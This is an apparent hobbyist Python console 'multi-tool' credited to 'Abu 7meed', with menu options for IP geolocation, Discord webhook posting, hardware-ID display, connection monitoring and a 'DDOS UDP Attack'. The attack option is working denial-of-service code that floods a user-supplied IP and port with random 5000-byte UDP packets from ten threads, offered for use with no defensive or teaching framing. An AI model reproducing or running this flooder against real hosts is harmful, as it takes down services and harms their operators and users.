import requests
import json
import os
try:
    from colorama import Fore,init
    init()
except ImportError:
    os.system("pip3 install colorama")
import time
import sys
import socket
import threading
import random
import psutil


class color:
    red = '\033[31m'
    green = '\033[32m'
    End = '\033[0m'

def rainbow_text():
    colors = [
        '\033[38;2;255;0;0m',    
        '\033[38;2;255;165;0m',  
        '\033[38;2;255;255;0m',  
        '\033[38;2;0;255;0m',    
        '\033[38;2;0;0;255m',    
        '\033[38;2;128;0;128m'   
    ]
    return colors


logo = f"""
                /$$$$$$ /$$                      /$$$$$$$$                                   /$$
               /$$__  $| $$                     |_____ $$/                                  | $$
              | $$  \ $| $$$$$$$ /$$   /$$           /$$/$$$$$$/$$$$  /$$$$$$  /$$$$$$  /$$$$$$$
              | $$$$$$$| $$__  $| $$  | $$          /$$| $$_  $$_  $$/$$__  $$/$$__  $$/$$__  $$
              | $$__  $| $$  \ $| $$  | $$         /$$/| $$ \ $$ \ $| $$$$$$$| $$$$$$$| $$  | $$
              | $$  | $| $$  | $| $$  | $$        /$$/ | $$ | $$ | $| $$_____| $$_____| $$  | $$
              | $$  | $| $$$$$$$|  $$$$$$/       /$$/  | $$ | $$ | $|  $$$$$$|  $$$$$$|  $$$$$$$
              |__/  |__|_______/ \______/       |__/   |__/ |__/ |__/\_______/\_______/\_______/

                  ---------------->[This code was written by Abu 7meed]<-----------------
                  -----------> 📬 Catch me on Discord: llzd Let's chat! 📬 <-----------"""


def center_text(text, width=None):
    if width is None:
        try:
            width = os.get_terminal_size().columns
        except:
            width = 80
    if text.strip().startswith('def '):
        return text
    import re
    ansi_escape = re.compile(r'\x1B\[[0-9;]*[mK]')
    plain_text = ansi_escape.sub('', text)
    padding = (width - len(plain_text)) // 2
    return ' ' * max(0, padding) + text if text.strip() else text

def getHwid():
    print("\033[38;2;255;0;0mCPU Serial\033[38;2;255;255;255m")
    print(os.system("wmic cpu get ProcessorId"))

    print("\033[38;2;255;0;0mDisk Serial\033[38;2;255;255;255m")
    print(os.system("wmic diskdrive get SerialNumber"))

    print("\033[38;2;255;0;0mMotherboard Serial\033[38;2;255;255;255m")
    print(os.system("wmic baseboard get SerialNumber"))

import requests

def send_to_discord(webhook_url, content, botName):
    data = {
        "content": content,
        "username": botName  
    }
    
    response = requests.post(webhook_url, json=data)
    
    if response.status_code == 204:
        print("Message sent successfully.")
    else:
        print(f"Failed to send message: {response.status_code} - {response.text}")

RED_COLOR = '\033[38;2;255;0;0m'

def get_server_connections():
    try:
        connections = psutil.net_connections(kind='inet')
        established_connections = [conn for conn in connections if conn.status == 'ESTABLISHED']
        
        os.system('cls')
        print(f"{RED_COLOR}Server Connections Monitor")
        print(f"{RED_COLOR}═" * 50)
        
        for conn in established_connections:
            local_ip, local_port = conn.laddr
            remote_ip, remote_port = conn.raddr
            
            try:
                process_name = psutil.Process(conn.pid).name()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                process_name = "Unknown"
                
            print(f"{RED_COLOR}Process: {process_name}")
            print(f"{RED_COLOR}Remote IP: {remote_ip}")
            print(f"{RED_COLOR}Remote Port: {remote_port}")
            print(f"{RED_COLOR}Local IP: {local_ip}")
            print(f"{RED_COLOR}Local Port: {local_port}")
            print(f"{RED_COLOR}═" * 50)
            
        return True
    except Exception as e:
        print(f"{RED_COLOR}Error: {str(e)}")
        return False

if __name__ == "__main__":
    os.system('color 0C')
    last_input_time = 0
    last_input = None

    while True:
        os.system(f'title Abu7meed Tool - BY llzd on dc')
        os.system("cls")
        
        
        logo_lines = [line for line in logo.split('\n') if line.strip()]
        for line in logo_lines:
            if line.strip():
                print(center_text(line))
        
        print("\n" * 2)  
        
        
        print(center_text(f"{RED_COLOR}[Press Enter twice to close the tool]"))
        print()
        
        
        menu_options = [
            f"{RED_COLOR}[1] IP Lookup",
            f"{RED_COLOR}[2] Webhook Sender",
            f"{RED_COLOR}[3] Show HWID",
            f"{RED_COLOR}[4] DDOS UDP",
            f"{RED_COLOR}[5] Get Server IP"
        ]
        
        
        term_width = os.get_terminal_size().columns
        
        
        header = "═" * 50
        print(center_text(f"{RED_COLOR}{header}"))
        print(center_text(f"{RED_COLOR}Menu Options"))
        print(center_text(f"{RED_COLOR}{header}"))
        print()  
        
        
        for option in menu_options:
            print(center_text(option))
            print()  
        
        
        print(center_text(f"{RED_COLOR}{header}"))
        print("\n")  
        
        
        prompt = f"{RED_COLOR}Option: "
        print(f"{' ' * ((term_width - len('Option: ')) // 2)}{prompt}", end='')
        x = input()
        
        
        current_time = time.time()
        if x == "" and last_input == "":
            if current_time - last_input_time < 1:  
                print(f"\n{RED_COLOR}Closing tool...")
                time.sleep(1)
                sys.exit()
        
        last_input = x
        last_input_time = current_time
        
        if x == "1":
            os.system("cls")
            print(RED_COLOR)  
            print("\nIP Lookup")
            ip = input("Enter IP: ")
            try:
                r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
                if r.status_code == 200:
                    data = r.json()
                    if data["status"] == "success":
                        print("")
                        print(f"\033[38;2;255;0;0mCountry:\033[38;2;255;255;255m {data.get('country', 'N/A')}")
                        print(f"\033[38;2;255;0;0mCity:\033[38;2;255;255;255m {data.get('city', 'N/A')}")
                        print(f"\033[38;2;255;0;0mRegion:\033[38;2;255;255;255m {data.get('regionName', 'N/A')}")
                        print(f"\033[38;2;255;0;0mTimeZone:\033[38;2;255;255;255m {data.get('timezone', 'N/A')}")
                    else:
                        print("\nFailed to get IP information")
                else:
                    print("\nFailed to connect to IP lookup service")
            except Exception as e:
                print(f"\nError occurred: {str(e)}")
            print("")
            pause = input(f"{RED_COLOR}Press Enter to return...")

        if x == "2":
            os.system("cls")
            print(RED_COLOR)  
            print("\nNote: Press Enter twice to return to main menu\n")
            webhook = input("Webhook URL: ")
            if not webhook.strip():
                input("\nReturning to main menu...")
                continue
            message = input("Message: ")
            if not message.strip():
                input("\nReturning to main menu...")
                continue
            botName = input("Bot Name: ")
            if not botName.strip():
                botName = "Default Bot"
            send_to_discord(webhook, message, botName)
            pause = input(f"{RED_COLOR}Press Enter to return...")  


        if x == "3":
            os.system("cls")
            print(RED_COLOR)  
            getHwid()
            pause = input(f"{RED_COLOR}Press Enter to return...")
            
            
        if x == "4":
            os.system("cls")
            print(RED_COLOR)  
            print("\nDDOS UDP Attack")
            print(f"{RED_COLOR}═" * 50)
            print("\nNote: Press Enter twice to return to main menu\n")
            
            host = input(f"{RED_COLOR}Target IP: ")
            if not host.strip():
                input("\nReturning to main menu...")
                continue
            
            port = input(f"{RED_COLOR}Target port: ")
            if not port.strip():
                input("\nReturning to main menu...")
                continue
            
            try:
                UDP_PORT = int(port)
                if UDP_PORT < 1 or UDP_PORT > 65535:
                    raise ValueError("Port must be between 1-65535")
            except ValueError as e:
                print(f"\n{RED_COLOR}Invalid port number! {str(e)}")
                input(f"{RED_COLOR}Press Enter to return...")
                continue

            try:
                ip = socket.gethostbyname(host)
                os.system('cls')
                print(f"{RED_COLOR}═" * 50)
                print(f"{RED_COLOR}Target IP: {ip}")
                print(f"{RED_COLOR}Target Port: {UDP_PORT}")
                print(f"{RED_COLOR}Threads: 10")
                print(f"{RED_COLOR}═" * 50)
                print(f"\n{RED_COLOR}Starting attack...")
                time.sleep(2)
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                bytes = random._urandom(5000)
                stop_event = threading.Event()
                sent = [0]
                
                def attack():
                    while not stop_event.is_set():
                        try:
                            sock.sendto(bytes, (ip, UDP_PORT))
                            sock.sendto(bytes, (ip, UDP_PORT))
                            sent[0] += 1
                            print(f"{RED_COLOR}[+] Sent {sent[0]} packets to {ip}:{UDP_PORT}")
                        except Exception as e:
                            print(f"{RED_COLOR}Error: {e}")
                            break
                
                threads = []
                for i in range(10):  # Fixed 10 threads
                    thread = threading.Thread(target=attack)
                    thread.daemon = True
                    threads.append(thread)
                
                # Start all threads
                for thread in threads:
                    thread.start()
                
                print(f"\n{RED_COLOR}Attack started with 10 threads")
                print(f"{RED_COLOR}Press Enter to stop...")
                
                try:
                    input()
                finally:
                    stop_event.set()
                    sock.close()
                    print(f"\n{RED_COLOR}Attack stopped")
                    print(f"\n{RED_COLOR}Attack stopped")
                    print(f"{RED_COLOR}Total packets sent: {sent[0]}")
                    
            except socket.gaierror:
                print(f"\n{RED_COLOR}Invalid IP address or hostname!")
                input(f"{RED_COLOR}Press Enter to return...")
                
                
        if x == "5":
            os.system("cls")
            print(RED_COLOR)  
            print("\nGet Server IP Monitor")
            print(f"{RED_COLOR}═" * 50)
            print(f"{RED_COLOR}[1] Auto Refresh Monitor")
            print(f"{RED_COLOR}[2] Single Check")
            print(f"{RED_COLOR}═" * 50)
            
            mode = input(f"{RED_COLOR}Select mode (1-2): ")
            
            # Add monitor type selection
            print(f"\n{RED_COLOR}Monitor Type:")
            print(f"{RED_COLOR}[1] All Information (Server IP, Port, Local IP, Port)")
            print(f"{RED_COLOR}[2] Server Information Only (Server IP, Port)")
            monitor_type = input(f"{RED_COLOR}Select type (1-2): ")
            
            def display_connections(conn, show_all=True):
                try:
                    process_name = psutil.Process(conn.pid).name()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    process_name = "Unknown"
                
                remote_ip, remote_port = conn.raddr
                print(f"{RED_COLOR}Process: {process_name}")
                print(f"{RED_COLOR}Server IP: {remote_ip}")
                print(f"{RED_COLOR}Server Port: {remote_port}")
                
                if show_all:
                    local_ip, local_port = conn.laddr
                    print(f"{RED_COLOR}Local IP: {local_ip}")
                    print(f"{RED_COLOR}Local Port: {local_port}")
                print(f"{RED_COLOR}═" * 50)
            
            def get_server_connections(show_all=True):
                try:
                    connections = psutil.net_connections(kind='inet')
                    established_connections = [conn for conn in connections if conn.status == 'ESTABLISHED']
                    
                    os.system('cls')
                    print(f"{RED_COLOR}Server Connections Monitor")
                    print(f"{RED_COLOR}═" * 50)
                    
                    for conn in established_connections:
                        display_connections(conn, show_all)
                    return True
                except Exception as e:
                    print(f"{RED_COLOR}Error: {str(e)}")
                    return False
            
            show_all = monitor_type == "1"
            
            if mode == "1":
                try:
                    interval = input(f"{RED_COLOR}Enter refresh interval in seconds (default: 2): ")
                    interval = float(interval) if interval.strip() else 2.0
                    
                    if interval < 0.5:
                        print(f"{RED_COLOR}Interval too short, setting to minimum (0.5s)")
                        interval = 0.5
                    
                    print(f"\n{RED_COLOR}Monitoring server connections every {interval} seconds")
                    print(f"{RED_COLOR}Press Enter to stop monitoring and return to menu\n")
                    
                    stop_event = threading.Event()
                    
                    def monitor():
                        while not stop_event.is_set():
                            get_server_connections(show_all)
                            time.sleep(interval)
                    
                    monitor_thread = threading.Thread(target=monitor)
                    monitor_thread.daemon = True
                    monitor_thread.start()
                    
                    input()
                    stop_event.set()
                    time.sleep(0.5)
                    
                except ValueError:
                    print(f"{RED_COLOR}Invalid interval! Using default (2s)")
                    time.sleep(2)
                except KeyboardInterrupt:
                    pass
                finally:
                    print(f"\n{RED_COLOR}Monitoring stopped")
                    
            elif mode == "2":
                get_server_connections(show_all)
                print(f"\n{RED_COLOR}Single check completed")
            
            else:
                print(f"{RED_COLOR}Invalid option!")
                time.sleep(1)
            
            input(f"{RED_COLOR}Press Enter to return to menu...")